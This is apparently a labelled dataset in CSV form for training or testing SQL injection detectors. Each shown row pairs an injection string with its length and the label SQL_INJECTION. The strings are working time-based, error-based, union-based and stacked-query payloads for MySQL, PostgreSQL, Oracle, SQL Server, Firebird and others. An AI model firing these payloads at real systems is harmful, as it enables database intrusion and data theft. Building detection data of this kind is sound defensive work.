payload,length,label
"1')) as egsj where 3447=3447;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",145,SQL_INJECTION
1'))) and (3020=3020)*6703 and ((('nhrc' like 'nhrc,51,SQL_INJECTION
-4331) as inpx where 9804=9804 union all select 9804#,53,SQL_INJECTION
"1"" where 9173=9173 rlike (select (case when (7689=7689) then 1 else 0x28 end))--",80,SQL_INJECTION
"1') where 3450=3450 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",95,SQL_INJECTION
1%')) and 8594=(select 8594 from pg_sleep(5))--,47,SQL_INJECTION
"1',(select (case when (3888=3888) then (select count(*) from generate_series(1,5000000)) else 1/(select 0) end))",112,SQL_INJECTION
"1"");select * from generate_series(9434,9434,case when (9434=3991) then 1 else 0 end) limit 1--",94,SQL_INJECTION
"1'))) union all select null,null,null,null,null,null,null,null#",63,SQL_INJECTION
"1"") rlike sleep(5) and (""efoq"" like ""efoq",41,SQL_INJECTION
"1"") where 1330=1330 or (select * from (select(sleep(5)))ydpu)--",63,SQL_INJECTION
"1') or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ('xzlx' like 'xzlx",227,SQL_INJECTION
"1') where 1323=1323 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",110,SQL_INJECTION
"1%')) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('%'='",172,SQL_INJECTION
"-1868"") where 9495=9495 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",154,SQL_INJECTION
1wwis,5,SQL_INJECTION
"1"") as lkzz where 3565=3565 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",137,SQL_INJECTION
"1"")) as eglv where 7412=7412 union all select null#",51,SQL_INJECTION
"1%"") or 6793=(select 6793 from pg_sleep(5)) and (""%""=""",54,SQL_INJECTION
"1%""))) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (((""%""=""",206,SQL_INJECTION
"1%"") and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",103,SQL_INJECTION
"(select 2*(if((select * from (select concat(0x7171706a71,(select (elt(6130=6130,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",151,SQL_INJECTION
"1) as vqbf where 4020=4020;select benchmark(5000000,md5(0x4c4d6142))--",70,SQL_INJECTION
1'+(select qpaf where 7859=7859 or (select * from (select(sleep(5)))ydpu))+',76,SQL_INJECTION
"1"")) as paep where 8947=8947 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",201,SQL_INJECTION
"1%"");select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",98,SQL_INJECTION
"1')) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (('xuwl' like 'xuwl",132,SQL_INJECTION
1'+(select lptb where 3861=3861 or sleep(5))+',46,SQL_INJECTION
1%'));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,89,SQL_INJECTION
"1"") where 1107=1107 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",122,SQL_INJECTION
"1'+(select 'asdq' where 4023=4023 and make_set(8403=8403,8899))+'",65,SQL_INJECTION
"1'));iif(8213=4718,1,1/0)",25,SQL_INJECTION
"-5571' union all select 8846,8846,8846,8846,8846,8846,8846#",59,SQL_INJECTION
"1%"")) or (select * from (select(sleep(5)))sddo)#",48,SQL_INJECTION
"1');select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ('oskf' like 'oskf",112,SQL_INJECTION
"1 where 4949=4949;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",109,SQL_INJECTION
1 where 1931=1931 and sleep(5)--,32,SQL_INJECTION
"1) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)",204,SQL_INJECTION
1 where 6494=6494 and 8463=2760,31,SQL_INJECTION
"1;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4-- sapi",103,SQL_INJECTION
"1' and 3824=benchmark(5000000,md5(0x76555642)) and 'pbin'='pbin",63,SQL_INJECTION
-5062) where 7457=7457 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,255,SQL_INJECTION
1'||(select 'dfmw' from dual where 1723=1723;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,128,SQL_INJECTION
"1"") and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""rvub"" like ""rvub",132,SQL_INJECTION
"1"") and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",102,SQL_INJECTION
"1' in boolean mode) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)#",160,SQL_INJECTION
"1 union all select null,null,null--",35,SQL_INJECTION
"1%"";create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ""%""=""",128,SQL_INJECTION
"1)));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",72,SQL_INJECTION
-8922 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')-- krmh,105,SQL_INJECTION
"-5703') or elt(2972=8708,8708)",30,SQL_INJECTION
"1%"")));begin dbms_lock.sleep(5); end and (((""%""=""",49,SQL_INJECTION
1') where 2974=2974 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,220,SQL_INJECTION
1)) and (3020=3020)*6703 and ((3078=3078,40,SQL_INJECTION
"1') where 8586=8586 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",82,SQL_INJECTION
1'))) or 6793=(select 6793 from pg_sleep(5)) and ((('ugrk'='ugrk,64,SQL_INJECTION
"1%'))) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",82,SQL_INJECTION
"-8358'))) union all select 7282,7282--",38,SQL_INJECTION
"1"")));select sleep(5) and (((""wucy"" like ""wucy",46,SQL_INJECTION
"1%' and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",106,SQL_INJECTION
"1%"" and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",66,SQL_INJECTION
-5291')) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('tmpm'='tmpm,229,SQL_INJECTION
"1"")) as bosq where 4695=4695;select benchmark(5000000,md5(0x714e4153))#",71,SQL_INJECTION
"1"") or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (""zzkc""=""zzkc",171,SQL_INJECTION
1' where 2547=2547 and 6969=(select 6969 from pg_sleep(5))--,60,SQL_INJECTION
"1'))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((('xngr'='xngr",100,SQL_INJECTION
1%'));begin dbms_lock.sleep(5); end and (('%'=',47,SQL_INJECTION
1') as xwlf where 9424=9424;(select * from (select(sleep(5)))acdk)#,67,SQL_INJECTION
"1') and elt(1210=1210,sleep(5))",31,SQL_INJECTION
"1') and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('iixp'='iixp",115,SQL_INJECTION
1')) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('cuav'='cuav,204,SQL_INJECTION
"1') or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('ireg' like 'ireg",122,SQL_INJECTION
1' in boolean mode) union all select null#,42,SQL_INJECTION
1%');select sleep(5) and ('%'=',31,SQL_INJECTION
1;(select * from (select(sleep(5)))acdk)#,41,SQL_INJECTION
1'||(select 'xugb' from dual where 6772=6772;if(7899=7899) select 7899 else drop function zbbp--,96,SQL_INJECTION
"-9096"") where 9452=9452 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",256,SQL_INJECTION
"-9526 where 5734=5734 or elt(1032=1032,3623)--",46,SQL_INJECTION
"1""))) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",113,SQL_INJECTION
"-1000"" or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ""isbq""=""isbq",209,SQL_INJECTION
"1%"")) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((""%""=""",108,SQL_INJECTION
"1 where 9404=9404;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",108,SQL_INJECTION
"1' in boolean mode) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))#",122,SQL_INJECTION
"-3794') union all select 2485,2485,2485,2485,2485--",51,SQL_INJECTION
"1,(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4250=4250) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)",224,SQL_INJECTION
"1%')) union all select null,null#",33,SQL_INJECTION
"1'));select count(*) from generate_series(1,5000000)--",54,SQL_INJECTION
"-1816"") or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""dztr"" like ""dztr",225,SQL_INJECTION
"1"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""cuzi"" like ""cuzi",123,SQL_INJECTION
"1' where 9206=9206;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",110,SQL_INJECTION
"1')) and 8407=(select count(*) from generate_series(1,5000000)) and (('lwyo'='lwyo",82,SQL_INJECTION
"1"")));iif(5257=5257,1,1/0)",26,SQL_INJECTION
"1));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((7749=7749",78,SQL_INJECTION
"1%""))) and sleep(5) and (((""%""=""",32,SQL_INJECTION
"1 where 3744=3744;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",85,SQL_INJECTION
"-9456%"")) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((""%""=""",207,SQL_INJECTION
"1%""));(select * from (select(sleep(5)))srmq) and ((""%""=""",56,SQL_INJECTION
"1%"";select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",87,SQL_INJECTION
1'))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((('snoa'='snoa,119,SQL_INJECTION
-1641' union all select 4835#,29,SQL_INJECTION
"1' and make_set(8403=8403,8899) and 'niux'='niux",48,SQL_INJECTION
"1'));select benchmark(5000000,md5(0x4c4d6142)) and (('nczi'='nczi",65,SQL_INJECTION
"1') as wjty where 2971=2971;select benchmark(5000000,md5(0x714e4153))#",70,SQL_INJECTION
"-2197' union all select 8065,8065,8065,8065--",45,SQL_INJECTION
"1') as scnn where 9274=9274;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",95,SQL_INJECTION
1%')) rlike (select * from (select(sleep(5)))sgvo) and (('%'=',62,SQL_INJECTION
-9434') union all select 3106#,30,SQL_INJECTION
"-5802'))) union all select 6286,6286,6286,6286#",47,SQL_INJECTION
1';select (case when (3855=3855) then 3855 else 1/(select 0) end)--,67,SQL_INJECTION
1' and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and 'ixzr'='ixzr,251,SQL_INJECTION
"1);select count(*) from generate_series(1,5000000) and (8997=8997",65,SQL_INJECTION
-3881))) union all select 4438--,32,SQL_INJECTION
"1') and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ('dtym'='dtym",113,SQL_INJECTION
"1"" where 5927=5927;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",110,SQL_INJECTION
"1%')) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (('%'='",218,SQL_INJECTION
"1%') or elt(6272=6272,sleep(5)) and ('%'='",42,SQL_INJECTION
"1%"") and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",67,SQL_INJECTION
"1%') union all select null,null,null,null,null,null,null,null#",62,SQL_INJECTION
"1%"");select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",101,SQL_INJECTION
1) where 3381=3381 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,252,SQL_INJECTION
"1') as nexa where 6740=6740;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",112,SQL_INJECTION
"1' and elt(4249=4249,7259) and 'awjd'='awjd",43,SQL_INJECTION
"1%'))) union all select null,null,null,null,null,null,null--",60,SQL_INJECTION
"1"" and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))",105,SQL_INJECTION
1';select (case when (8993=4660) then 1 else 8993*(select 8993 from master..sysdatabases) end)--,96,SQL_INJECTION
1') where 5491=5491 and 9198=9198--,35,SQL_INJECTION
-7600' or 7684=3181#,20,SQL_INJECTION
-4363%'))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((('%'=',116,SQL_INJECTION
"1"")) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""zptu""=""zptu",219,SQL_INJECTION
1) where 1090=1090 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--,114,SQL_INJECTION
"1') and 8407=(select count(*) from generate_series(1,5000000)) and ('lwrk' like 'lwrk",85,SQL_INJECTION
"1') or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ('kejy'='kejy",112,SQL_INJECTION
"1"")) as tncm where 8203=8203 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",131,SQL_INJECTION
1;waitfor delay '0:0:5'# ogzq,29,SQL_INJECTION
"1"")) and sleep(5) and ((""timv""=""timv",36,SQL_INJECTION
1)) as svhd where 9761=9761;select case when 7717=7717 then 1 else null end--,77,SQL_INJECTION
1%')) or sleep(5) and (('%'=',29,SQL_INJECTION
-3921') as audo where 7087=7087 or 1755=4937--,46,SQL_INJECTION
"1') as afnt where 4719=4719 and elt(8224=1275,1275)--",53,SQL_INJECTION
"1' in boolean mode) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)#",110,SQL_INJECTION
"-7627%"")) union all select 4011,4011,4011,4011,4011,4011,4011,4011,4011,4011--",78,SQL_INJECTION
"1""))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (((""buwe""=""buwe",119,SQL_INJECTION
1%') waitfor delay '0:0:5' and ('%'=',37,SQL_INJECTION
"-4772))) union all select 3879,3879,3879,3879,3879--",52,SQL_INJECTION
1';begin user_lock.sleep(5); end--,34,SQL_INJECTION
"1 where 4319=4319 and 8635=(select count(*) from generate_series(1,5000000))--",78,SQL_INJECTION
"1'+(select mcfb where 4050=4050 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3))+'",127,SQL_INJECTION
"-2852%') or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",139,SQL_INJECTION
"1') and elt(4249=4249,7259) and ('ifca' like 'ifca",50,SQL_INJECTION
"1' where 7688=7688 union all select null,null,null,null,null,null,null,null,null--",82,SQL_INJECTION
-1989%')) or 6179=8518#,23,SQL_INJECTION
1'))) rlike (select * from (select(sleep(5)))sgvo) and ((('wuux'='wuux,70,SQL_INJECTION
"1' in boolean mode) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)#",125,SQL_INJECTION
"1'+(select 'sqje' where 1634=1634 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)))+'",138,SQL_INJECTION
"1' in boolean mode);create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)#",135,SQL_INJECTION
"-8812"") where 1646=1646 union all select 1646,1646,1646,1646,1646,1646--",72,SQL_INJECTION
1) where 8616=8616 and 2006=2006,32,SQL_INJECTION
"-9820"" or 1038=7502#",20,SQL_INJECTION
"1)) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((2748=2748",122,SQL_INJECTION
"1"") where 2839=2839 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",118,SQL_INJECTION
"1%"" and 8635=(select count(*) from generate_series(1,5000000))--",64,SQL_INJECTION
"-9988%"" or elt(1032=1032,3623) and ""%""=""",40,SQL_INJECTION
"1"")) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""xqlh""=""xqlh",226,SQL_INJECTION
"1"" procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ""ikhr""=""ikhr",109,SQL_INJECTION
"-6307' where 8916=8916 union all select 8916,8916,8916,8916,8916,8916,8916--",76,SQL_INJECTION
"-2909'||(select 'qfeq' where 7062=7062 union all select 7062,7062,7062,7062,7062,7062--",87,SQL_INJECTION
"1')) as vuzt where 4971=4971;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",125,SQL_INJECTION
"-9676 or elt(1032=1032,3623)# jcaq",34,SQL_INJECTION
"1"")) and 4595=4595#",19,SQL_INJECTION
"1"")) as whyr where 9731=9731 rlike (select * from (select(sleep(5)))sgvo)--",75,SQL_INJECTION
1))) rlike sleep(5)#,20,SQL_INJECTION
1)) union all select null--,27,SQL_INJECTION
"-8215%"") union all select 3877,3877,3877,3877,3877,3877--",57,SQL_INJECTION
1'));begin user_lock.sleep(5); end and (('pfrt'='pfrt,53,SQL_INJECTION
-2432')) or (8459=8459)*4906 and (('ejhp'='ejhp,47,SQL_INJECTION
-1217'))) order by 1#,21,SQL_INJECTION
"1'||(select 'yrau' where 7860=7860 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))||'",144,SQL_INJECTION
"1 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",77,SQL_INJECTION
"1 or 8421=(select count(*) from generate_series(1,5000000))",59,SQL_INJECTION
"1"")) as hbfi where 4773=4773 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",233,SQL_INJECTION
"1%"")));waitfor delay '0:0:5'--",30,SQL_INJECTION
"1"" where 5517=5517 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",223,SQL_INJECTION
"1"") as dezr where 2145=2145 or sleep(5)#",40,SQL_INJECTION
"1)) as xovu where 4530=4530 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",179,SQL_INJECTION
"-3130'))) union all select 2886,2886,2886,2886,2886,2886,2886#",62,SQL_INJECTION
"1' and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)",94,SQL_INJECTION
"-3442' in boolean mode) union all select 6255,6255,6255,6255,6255#",66,SQL_INJECTION
"1') as xhmm where 8092=8092 union all select null,null,null--",61,SQL_INJECTION
"1,(select (case when (3888=3888) then (select count(*) from generate_series(1,5000000)) else 1/(select 0) end))",111,SQL_INJECTION
"1') procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",94,SQL_INJECTION
"1'+(select 'tzey' where 4491=4491 union all select null,null,null,null,null,null,null,null--",92,SQL_INJECTION
"1'+(select 'vbqo' where 5630=5630 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",124,SQL_INJECTION
1')) as qovd where 8865=8865 and (3020=3020)*6703--,51,SQL_INJECTION
"1)));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (((7946=7946",103,SQL_INJECTION
"-3177')) union all select 6500,6500,6500,6500,6500,6500,6500,6500,6500--",72,SQL_INJECTION
"1%"");begin user_lock.sleep(5); end--",36,SQL_INJECTION
"-7531'))) union all select 6900,6900,6900,6900,6900,6900,6900,6900,6900#",72,SQL_INJECTION
"1%"")) union all select null,null,null#",38,SQL_INJECTION
"1%"") union all select null,null,null,null,null,null#",52,SQL_INJECTION
"1""))) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",114,SQL_INJECTION
1' in boolean mode);select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,128,SQL_INJECTION
1 and sleep(5)# qcyj,20,SQL_INJECTION
"-2889)) as iqzv where 1786=1786 union all select 1786,1786,1786,1786,1786,1786,1786,1786--",90,SQL_INJECTION
"1"")) as dksq where 7161=7161;iif(5257=5257,1,1/0)",49,SQL_INJECTION
1) as dlkh where 6179=6179 and 9198=9198--,42,SQL_INJECTION
1 where 3357=3357 and (9492=4334)*4334--,40,SQL_INJECTION
"1%' and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and '%'='",107,SQL_INJECTION
"1' and make_set(9860=6956,6956) and 'toru'='toru",48,SQL_INJECTION
(select (case when (6838=2866) then 6838 else 1/(select 0) end)),64,SQL_INJECTION
"-5579%"") or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""%""=""",199,SQL_INJECTION
1%';select pg_sleep(5)--,24,SQL_INJECTION
"1%'))) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('%'='",215,SQL_INJECTION
"1%"" and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ""%""=""",184,SQL_INJECTION
"-6123"" or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ""zuzx""=""zuzx",116,SQL_INJECTION
"1%' and elt(1210=1210,sleep(5)) and '%'='",41,SQL_INJECTION
"1"" and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""lgwe"" like ""lgwe",220,SQL_INJECTION
1)) and 4637=1408 and ((6509=6509,33,SQL_INJECTION
"-4015'||(select 'qeqv' from dual where 1437=1437 union all select 1437,1437,1437,1437,1437,1437,1437,1437,1437#",111,SQL_INJECTION
"1%"" union all select null,null,null,null,null,null,null,null,null#",66,SQL_INJECTION
"1"" where 4684=4684 union all select null,null,null,null#",56,SQL_INJECTION
"1""))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (((""sfbc""=""sfbc",122,SQL_INJECTION
"1"");select (case when (3855=3855) then 3855 else 1/(select 0) end)--",68,SQL_INJECTION
"1%""))) or elt(6272=6272,sleep(5)) and (((""%""=""",46,SQL_INJECTION
"1');call regexp_substring(repeat(right(char(3702),0),500000000),null) and ('xcnj'='xcnj",87,SQL_INJECTION
"1') union all select null,null,null,null--",42,SQL_INJECTION
"1' or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and 'zenl' like 'zenl",126,SQL_INJECTION
1))) and 2006=2006,18,SQL_INJECTION
"1') or 8466=benchmark(5000000,md5(0x694a4745)) and ('ffzv'='ffzv",64,SQL_INJECTION
1%' union all select null--,27,SQL_INJECTION
-4262%'))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('%'=',225,SQL_INJECTION
"1'+(select 'supo' where 8691=8691;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)+'",131,SQL_INJECTION
"1 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",100,SQL_INJECTION
"-7007) union all select 6704,6704--",35,SQL_INJECTION
"-9622' union all select 7208,7208,7208,7208#",44,SQL_INJECTION
